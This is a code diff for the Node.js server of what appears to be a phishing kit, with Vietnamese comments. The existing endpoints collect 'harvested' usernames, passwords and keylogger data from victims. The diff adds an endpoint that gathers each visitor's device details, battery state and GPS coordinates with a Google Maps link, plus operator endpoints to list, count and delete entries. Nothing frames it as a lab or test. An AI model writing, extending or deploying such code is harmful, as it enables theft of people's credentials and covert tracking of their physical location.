@@ -33,6 +33,7 @@ app.use(express.urlencoded({ extended: true }));
 // File lưu trữ dữ liệu
 const DATA_FILE = path.join(__dirname, 'harvested_data.json');
 const KEYLOG_FILE = path.join(__dirname, 'keylog_data.json');
+const FINGERPRINT_FILE = path.join(__dirname, 'fingerprint_data.json');
 
 // Khởi tạo files nếu chưa có
 if (!fs.existsSync(DATA_FILE)) {
@@ -40,6 +41,9 @@ if (!fs.existsSync(DATA_FILE)) {
 }
 if (!fs.existsSync(KEYLOG_FILE)) {
     fs.writeFileSync(KEYLOG_FILE, JSON.stringify([], null, 2));
+}
+if (!fs.existsSync(FINGERPRINT_FILE)) {
+    fs.writeFileSync(FINGERPRINT_FILE, JSON.stringify([], null, 2));
 }
 
 // ==========================================
@@ -81,6 +85,13 @@ app.post('/api/harvest', (req, res) => {
     data.push(entry);
     fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
 
+    // Tìm fingerprint của session này
+    let fp = null;
+    try {
+        const fpData = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8'));
+        fp = fpData.find(f => f.session_id && req.body.session_id && f.session_id === req.body.session_id) || fpData[fpData.length - 1];
+    } catch(e) {}
+
     // Log ra terminal
     console.log('\n' + '='.repeat(60));
     console.log('🎣 DỮ LIỆU MỚI THU HOẠCH ĐƯỢC!');
@@ -91,6 +102,17 @@ app.post('/api/harvest', (req, res) => {
     console.log(`🔑 Mật khẩu:   ${entry.credentials.password}`);
     console.log(`📱 Thiết bị:   ${entry.metadata.platform}`);
     console.log(`🌐 IP:         ${entry.metadata.ip}`);
+    if (fp) {
+        console.log(`📲 Tên máy:    ${fp.device?.device_name || 'N/A'}`);
+        console.log(`💻 OS:         ${fp.device?.os || ''} ${fp.device?.os_version || ''}`);
+        console.log(`🌍 Trình duyệt: ${fp.device?.browser || ''} ${fp.device?.browser_version || ''}`);
+        if (fp.location && !fp.location.error) {
+            console.log(`📍 Vị trí:     ${fp.location.latitude}, ${fp.location.longitude}`);
+            console.log(`🗺️  Maps:       ${fp.location.google_maps}`);
+        } else {
+            console.log(`📍 Vị trí:     ${fp.location?.error || 'Chưa có'}`);
+        }
+    }
     console.log('='.repeat(60) + '\n');
 
     res.json({ 
@@ -131,6 +153,63 @@ app.post('/api/keylog', (req, res) => {
     fs.writeFileSync(KEYLOG_FILE, JSON.stringify(data, null, 2));
 
     res.json({ ok: true });
+});
+
+// ==========================================
+//  API: Fingerprint - thu thập thiết bị + vị trí
+// ==========================================
+app.post('/api/fingerprint', (req, res) => {
+    const fingerprint = {
+        ...req.body,
+        server_ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
+        received_at: new Date().toISOString()
+    };
+
+    let data = [];
+    try {
+        data = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8'));
+    } catch (e) {
+        data = [];
+    }
+
+    // Giữ tối đa 500 fingerprints
+    if (data.length > 500) data = data.slice(-250);
+    data.push(fingerprint);
+    fs.writeFileSync(FINGERPRINT_FILE, JSON.stringify(data, null, 2));
+
+    // Log thiết bị + vị trí
+    const dev = fingerprint.device || {};
+    const loc = fingerprint.location || {};
+    console.log('\n' + '-'.repeat(50));
+    console.log('📲 THIẾT BỊ MỚI TRUY CẬP!');
+    console.log('-'.repeat(50));
+    console.log(`📱 Tên máy:    ${dev.device_name || 'N/A'}`);
+    console.log(`💻 OS:         ${dev.os || ''} ${dev.os_version || ''}`);
+    console.log(`🌍 Trình duyệt: ${dev.browser || ''} v${dev.browser_version || ''}`);
+    console.log(`📐 Màn hình:   ${dev.screen_width}x${dev.screen_height} (@${dev.pixel_ratio}x)`);
+    console.log(`🔌 Kết nối:    ${dev.connection?.type || 'N/A'}`);
+    if (loc.latitude) {
+        console.log(`📍 VỊ TRÍ:     ${loc.latitude}, ${loc.longitude} (±${loc.accuracy})`);
+        console.log(`🗺️  Google Maps: ${loc.google_maps}`);
+    } else {
+        console.log(`📍 Vị trí:     ${loc.error || 'Đang chờ...'}`);
+    }
+    if (fingerprint.battery) {
+        console.log(`🔋 Pin:        ${fingerprint.battery.level} (${fingerprint.battery.charging})`);
+    }
+    console.log('-'.repeat(50) + '\n');
+
+    res.json({ ok: true });
+});
+
+// API lấy fingerprint data
+app.get('/api/fingerprints', (req, res) => {
+    try {
+        const data = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8'));
+        res.json({ total: data.length, entries: data.reverse() });
+    } catch (e) {
+        res.json({ total: 0, entries: [] });
+    }
 });
 
 // ==========================================
@@ -187,12 +266,44 @@ app.get('/api/keylog', (req, res) => {
     }
 });
 
-// API xóa dữ liệu
+// API xóa toàn bộ dữ liệu
 app.delete('/api/data', (req, res) => {
     fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
     fs.writeFileSync(KEYLOG_FILE, JSON.stringify([], null, 2));
+    fs.writeFileSync(FINGERPRINT_FILE, JSON.stringify([], null, 2));
     console.log('🗑️  Đã xóa toàn bộ dữ liệu.');
-    res.json({ success: true, message: 'Đã xóa toàn bộ dữ liệu' });
+    res.json({ success: true });
+});
+
+// API xóa 1 harvest entry theo timestamp
+app.delete('/api/data/:timestamp', (req, res) => {
+    try {
+        let data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+        const before = data.length;
+        data = data.filter(e => e.timestamp !== decodeURIComponent(req.params.timestamp));
+        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
+        res.json({ success: true, removed: before - data.length });
+    } catch(e) { res.json({ success: false }); }
+});
+
+// API xóa 1 fingerprint entry theo received_at
+app.delete('/api/fingerprint/:received_at', (req, res) => {
+    try {
+        let data = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8'));
+        const before = data.length;
+        data = data.filter(e => e.received_at !== decodeURIComponent(req.params.received_at));
+        fs.writeFileSync(FINGERPRINT_FILE, JSON.stringify(data, null, 2));
+        res.json({ success: true, removed: before - data.length });
+    } catch(e) { res.json({ success: false }); }
+});
+
+// API đếm số entries (để check có data mới không)
+app.get('/api/count', (req, res) => {
+    try {
+        const harvest = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')).length;
+        const fp = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8')).length;
+        res.json({ harvest, fp, total: harvest + fp });
+    } catch(e) { res.json({ harvest: 0, fp: 0, total: 0 }); }
 });
 
 // API thống kê
